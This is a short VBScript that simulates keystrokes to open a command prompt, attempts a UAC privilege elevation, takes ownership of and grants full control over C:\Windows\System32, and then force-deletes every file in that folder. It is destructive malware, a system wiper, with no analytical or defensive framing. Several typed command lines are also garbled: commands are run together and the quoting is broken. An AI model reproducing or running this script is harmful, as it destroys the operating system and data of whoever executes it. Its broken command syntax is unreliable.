Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.SendKeys "^{ESC}" ' Simulates pressing Ctrl + Esc to open the Start menu
WScript.Sleep 200 ' Wait for a moment to ensure the Start menu opens
WshShell.SendKeys "r" ' Simulates pressing the R key

WScript.Sleep 100

WshShell.SendKeys "{ENTER}" ' Simulates pressing the Enter key

WshShell.Run "cmd"
 

WshShell.SendKeys " net session >nul 2>&1if %errorLevel% == 0 (set admin=1) else ( set admin=0)" 
 

Wshshell.SendKeys "{ENTER}"

WScript.Sleep 200

WshShell.SendKeys "echo UAC.ShellExecute %~s0, "", "", runas, 1 >> %temp%\getadmin.vbstemp%\getadmin.vbs del %temp%\getadmin.vbs exit /b"

Wshshell.SendKeys "{ENTER}"

WScript.Sleep 200

 WshShell.SendKeys "if %errorLevel% == 0 ( set admin=1 ) else ( set admin=0 ) REM If not running with admin privileges, elevate if %admin%==0" 


Wshshell.SendKeys "{ENTER}"

WScript.Sleep 200


WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y"


WshShell.SendKeys "{ENTER}"

WScript.Sleep 100


WshShell.SendKeys "icacls C:\Windows\System32 /grant administrators:F /t"


WshShell.SendKeys "{ENTER}" 


WScript.Sleep 100

WshShell.SendKeys "cd C:\Windows\System32"


WshShell.SendKeys "{ENTER}"

WScript.Sleep 100 


WshShell.SendKeys "del /F /S /Q *.*"


WshShell.SendKeys "{ENTER}"

WScript.Sleep 100
